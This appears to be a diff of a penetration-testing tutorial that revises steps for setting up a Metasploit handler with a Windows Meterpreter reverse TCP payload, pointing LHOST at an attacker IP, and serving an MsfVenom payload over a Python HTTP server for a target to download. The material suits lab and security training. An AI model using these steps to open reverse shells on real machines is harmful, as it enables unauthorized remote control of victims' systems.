@@ -82,9 +82,9 @@ Base on the result, the payload is currently set to default <kbd>generic/shell_r
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 ```
 
-Aside from that, we can also see that `LHOST` needs to be set. We don’t need to set LPORT because it already matches the option we set for the payload.
+Aside from that, thae `LHOST` needs to be set also. We don’t need to set `LPORT` because it already matches the option we set for the payload.
 
-We can set the LHOST option with the following command:
+We can set the `LHOST` option using the following command:
 
 ```bash
 set LHOST [Attacker IP]
@@ -102,18 +102,26 @@ msf6 exploit(multi/handler) > exploit
 
 ### 1.4 - Tranfser the Payload via Server
 
-Next, we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 
+After generating the payload using MsfVenom, the next step is to set up an HTTP server to transfer the payload. To do this, follow these steps:
 
-Open another terminal tab, then navigate to the folder location of the payload:
+Open another terminal tab or window to keep the current session active.
+
+Navigate to the folder location where you saved the payload using the cd command. For example:
 
 ```bash
-cd /tmp/
+cd /path/to/folder
 ```
 
-Start a Python3 HTTP server on port 80:
+Start the HTTP server in the same terminal tab by using a command like python if you have Python installed:
 
 ```bash
 sudo python3 -m http.server 80
+```
+
+or http.server if you are using Python 3:
+
+```bash
+sudo python3 -m http.server 8080
 ```
 
 ### 1.5 - Download Payload to Start the Communication on Exploit Handler
